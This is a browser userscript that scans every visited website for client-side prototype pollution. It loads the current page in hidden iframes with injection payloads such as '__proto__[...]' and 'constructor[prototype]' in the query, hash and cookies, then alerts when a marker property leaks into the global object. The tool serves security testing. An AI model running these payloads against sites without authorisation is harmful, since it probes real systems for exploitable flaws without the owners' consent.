// ==UserScript==
// @name        pp.js
// @namespace   *
// @include     *
// @version     1.3
// @grant       GM_addStyle
// ==/UserScript==

var bCheckCookies = 0

window.onbeforeunload = () => false

//	var i = 0
//	window.onbeforeunload = () => i++
//	setInterval (() => i > 0 && (i -= 2, top.location = 'https://spqr.zz.mu/204.php'), 1)

var aPayloads =
[
	'?__proto__[ppaaazzzn]=ppaaazzzv', 
	'?constructor[prototype][ppaaazzzn]=ppaaazzzv', 
	'?__proto__.ppaaazzzn=ppaaazzzv', 
	'?constructor.prototype.ppaaazzzn=ppaaazzzv', 
	'?__proto__={"ppaaazzzn":"ppaaazzzv"}', 
	'?constructor.prototype={"ppaaazzzn":"ppaaazzzv"}', 
	'?xxx={"__proto__":{"ppaaazzzn":"ppaaazzzv"}}', 
	'?xxx={"constructor":{"prototype":{"ppaaazzzn":"ppaaazzzv"}}}', 
	'?xxx=yyy&xxx[__proto__][__proto__][ppaaazzzn]=ppaaazzzv', 
	'?xxx=yyy&xxx.__proto__.__proto__.ppaaazzzn=ppaaazzzv'
]

var oCookiePayloads = 
{
	ppaaazzznc1: '__proto__[ppaaazzznc1]=ppaaazzzvc1', 
	ppaaazzznc2: 'constructor[prototype][ppaaazzznc2]=ppaaazzzvc2', 
	ppaaazzznc3: '__proto__.ppaaazzznc3=ppaaazzzvc3', 
	ppaaazzznc4: 'constructor.prototype.ppaaazzznc4=ppaaazzzvc4', 
	ppaaazzznc5: '__proto__={"ppaaazzznc5":"ppaaazzzvc5"}', 
	ppaaazzznc6: 'constructor.prototype={"ppaaazzznc6":"ppaaazzzvc6"}', 
	ppaaazzznc7: 'xxx7={"__proto__":{"ppaaazzznc7":"ppaaazzzvc7"}}', 
	ppaaazzznc8: 'xxx8={"constructor.prototype":{"ppaaazzznc8":"ppaaazzzvc8"}}'
}

aPayloads.forEach (i => aPayloads.push (i.replace ('?', '#')))

window.addEventListener ('DOMContentLoaded', i => aPayloads.forEach (checkFrames), false)

function checkFrames (sPayload, i)
{
	var ppUrl = buildURL (sPayload.replace ('ppaaazzzv', 'ppaaazzzv' + i))

	var ppFrame = document.createElement ('iframe')
	var ppName = 'ppframexxx' + i

	ppFrame.name = ppName
	ppFrame.src = ppUrl
	ppFrame.style.display = 'none'
	ppFrame.onload = checkFrame
	ppFrame.onerror = frameError

	document.body.appendChild (ppFrame)

	function checkFrame ()
	{
		var frPolluted = unsafeWindow.frames [ppName]
		
		try
		{
			var sPolluted = frPolluted.ppaaazzzn
		}
		catch (e)
		{
			confirm (e + '\r\n\r\n' + ppUrl) && window.open (ppUrl)
			
			return
		}
		
		sPolluted && alert (ppUrl)
	}
	
	function frameError ()
	{
		confirm ('Content Security Policy\r\n\r\n' + ppUrl) && window.open (ppUrl)
	}

	function buildURL (sPayload)
	{
		sPayload += ''
		sPayload.startsWith ('?') || sPayload.startsWith ('#') || (sPayload = '?' + sPayload)
		
		return	location.origin
				+
			location.pathname
				+ 
			(
				sPayload.startsWith ('?')
					?
				(location.search ? location.search + '&' + sPayload.slice (1): sPayload) + location.hash
					:
				location.search + (location.hash ? location.hash + '&' + sPayload.slice (1): sPayload)
			)
	}
}

function checkVars (e)
{
	if (!e || e.type != 'keydown' || e.altKey || e.modifiers)
	{
		var aCookiePayloads = Object.keys (oCookiePayloads)
		
		bCheckCookies && aCookiePayloads.forEach (k => document.cookie = oCookiePayloads [k])

		aCookiePayloads.forEach (k => unsafeWindow [k] && alert (oCookiePayloads [k]))
		
		unsafeWindow.ppaaazzzn && alert (location.href)
		
		for (var i = 0; i < unsafeWindow.frames.length; i++)
		{
			var ppFrame = unsafeWindow.frames [i]
			
			try
			{
				ppFrame.ppaaazzzn && alert (decodeURI (ppFrame.location.href))
			}
			catch (e)
			{
			}
		}
	}
}

window.addEventListener ('DOMContentLoaded', checkVars, false)
window.addEventListener ('load', checkVars, false)

window.setInterval (checkVars, 10000)
